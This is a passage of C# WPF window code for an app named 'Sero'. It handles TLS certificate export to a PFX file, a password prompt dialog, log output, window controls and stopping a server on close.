    private void ExportCert_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Export TLS Certificate (cert only)"
            };

            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportPfx(dialog.FileName);
            Log($"[+] Certificate exported to {dialog.FileName}");
            TxtStatusBar.Text = "Certificate exported.";
            MessageBox.Show(
                $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
        }
        catch (Exception ex)
        {
            Log($"[!] Export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private static string? PromptPassword(string message)
    {
        var dlg = new Window
        {
            Title = "Certificate Password",
            Width = 350, Height = 150,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = message, Foreground = Brushes.White, TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.PasswordBox { Margin = new Thickness(0, 0, 0, 8) };
        sp.Children.Add(tb);
        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right };
        string? result = null;
        btn.Click += (_, _) => { result = tb.Password; dlg.DialogResult = true; };
        sp.Children.Add(btn);
        dlg.Content = sp;
        tb.Focus();
        return dlg.ShowDialog() == true ? result : null;
    }

    // ── Logging ─────────────────────────────────────

    private void Log(string msg)
    {
        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}";
        TxtLogs.Text += entry + "\n";
        LogScroller?.ScrollToEnd();
    }

    // ── Window Controls ─────────────────────────────

    private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed)
            DragMove();
    }

    private void Minimize_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

    private WindowState _stateBeforeFullscreen;
    private double _widthBefore, _heightBefore, _leftBefore, _topBefore;

    private void Fullscreen_Click(object sender, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized || (Width == SystemParameters.WorkArea.Width && Height == SystemParameters.WorkArea.Height))
        {
            // Restore
            WindowState = _stateBeforeFullscreen;
            Width = _widthBefore;
            Height = _heightBefore;
            Left = _leftBefore;
            Top = _topBefore;
            BtnFullscreen.Content = "☐";
        }
        else
        {
            // Save current state
            _stateBeforeFullscreen = WindowState;
            _widthBefore = Width;
            _heightBefore = Height;
            _leftBefore = Left;
            _topBefore = Top;

            // Maximize to work area (not true fullscreen, keeps taskbar)
            WindowState = WindowState.Normal;
            Left = 0;
            Top = 0;
            Width = SystemParameters.WorkArea.Width;
            Height = SystemParameters.WorkArea.Height;
            BtnFullscreen.Content = "❐";
        }
    }

    private void Close_Click(object sender, RoutedEventArgs e)
    {
        _server?.Stop();
        Application.Current.Shutdown();
    }
}
